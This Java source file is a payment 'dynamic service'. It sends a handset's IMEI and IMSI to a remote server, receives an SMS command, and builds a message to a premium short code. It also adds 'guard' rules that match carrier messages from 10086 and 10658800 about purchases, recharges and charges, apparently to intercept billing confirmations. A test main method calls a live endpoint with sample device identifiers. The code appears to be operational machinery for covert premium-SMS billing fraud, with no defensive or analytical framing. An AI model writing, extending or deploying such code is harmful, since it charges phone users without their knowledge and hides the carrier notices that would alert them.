package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

public class XmwtMm3DynamicService implements IDynamicService{

	private static final String TYPE = "xmwtMm3";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String DEST = "1065842410";
	
	private static final String REQUESTMODEL = "cmd={cmd}&price={price}&g={g}&imei={imei}&imsi={imsi}&phone=13800138000";
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String cmd = map.get("cmd");
			String price = map.get("price");
			String g = map.get("g");
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			
			String param = REQUESTMODEL.replace("{cmd}",cmd).replace("{price}",price).replace("{g}",g).replace("{imei}",imei).replace("{imsi}",imsi);
			
			String responseTxt = GetData.getData(url, param);
			
			xml = parse(responseTxt);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parse(String responseTxt){
		
		if(responseTxt != null && responseTxt.length() > 10 && responseTxt.startsWith("a3#")){
			
			try{
				List<Sms> smsList = new ArrayList<Sms>();
				
				Sms sms = new Sms();
				
				sms.setSmsContent(responseTxt);
				sms.setSmsDest(DEST);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				smsList.add(sms);
				
				Sms guardSms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard1);
				guardList.add(guard2);
				
				guardList.add(guard3);
				guardList.add(guard4);
				
				guardSms.setGuardList(guardList);
				
				smsList.add(0, guardSms);
					
				return XstreamHelper.toXml(smsList);
				
			}catch(Exception e){
				
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
//		http://www.lenseen.com:8081/mmwn/get?cmd=3&price=10&g=99&imei=860174010602000&imsi=460030912121002&phone=13800138000
		String url = "http://www.lenseen.com:8081/mmwn/get";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("type", "xmwtMm3");
		map.put("channel", "10B101a87654322");
		map.put("cmd", "3");
		map.put("price", "10");
		map.put("g", "99");
		map.put("imsi","460004014262556");
		map.put("imei","865308021063756");
		
		System.out.println(new XmwtMm3DynamicService().dynamic(map));
		
		
	}

}
